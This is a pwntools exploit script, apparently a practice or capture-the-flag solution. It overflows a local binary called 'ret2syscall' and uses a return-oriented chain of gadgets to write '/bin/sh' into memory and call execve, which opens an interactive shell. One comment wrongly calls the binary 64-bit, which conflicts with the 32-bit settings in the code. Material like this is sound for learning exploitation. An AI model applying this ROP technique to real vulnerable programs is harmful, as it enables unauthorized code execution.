from pwn import *

# the binary is a 64-bit little-endian ELF
context.update(arch='i386', endian='little', os='linux')

p = process('./ret2syscall')       		# Spawn process

# receive the text printed by binary
p.recvuntil(b'Get access to the shell!\n')

offset 		= 44               			# offset to the return address
bss 		= 0x80e5000					# writeable memory location
mov_eax_edx = 0x8057646 				# mov dword ptr [eax + 4], edx ; ret ;
pop_eax 	= 0x80aff4a					# pop eax ; ret ;		
pop_ebx 	= 0x8049022					# pop ebx ; ret ;
pop_ecx 	= 0x805d621					# pop ecx ; add al, 0xf6 ; ret ;
pop_edx_ebx = 0x8058159					# pop edx ; pop ebx ; ret ;
int_80 		= 0x804a382					# int 0x80 ;

ropchain = b'A'*offset

# writing the /bin string into writable memory address bss
ropchain += p32(pop_edx_ebx)
ropchain += b'/bin'
ropchain += b'JUNK'						# write useless value into ebx
ropchain += p32(pop_eax)
ropchain += p32(bss - 4)
ropchain += p32(mov_eax_edx)

# writing the /sh string into writable memory address bss+4
ropchain += p32(pop_edx_ebx)
ropchain += b'/sh\x00'
ropchain += b'JUNK'						# write useless value into ebx
ropchain += p32(pop_eax)
ropchain += p32(bss)
ropchain += p32(mov_eax_edx)


# call to execve("/bin/sh", 0, 0)
# int 0x80 for execve requires 
# eax = 0xb (syscall code for execve)
# ecx = ecx = 0
# ebx = pointer to string '/bin/sh' (bss)
ropchain += p32(pop_ecx)
ropchain += p32(0x0)
ropchain += p32(pop_edx_ebx)
ropchain += p32(0x0)
ropchain += p32(bss)
ropchain += p32(pop_eax)
ropchain += p32(0xb)
ropchain += p32(int_80)

# saving the payload for direct use
# cat payload | ./ret2syscall
with open('payload', 'wb+') as fp:
	fp.write(ropchain)

p.sendline(ropchain)

# bash has been opened and can be interacted with
p.interactive()
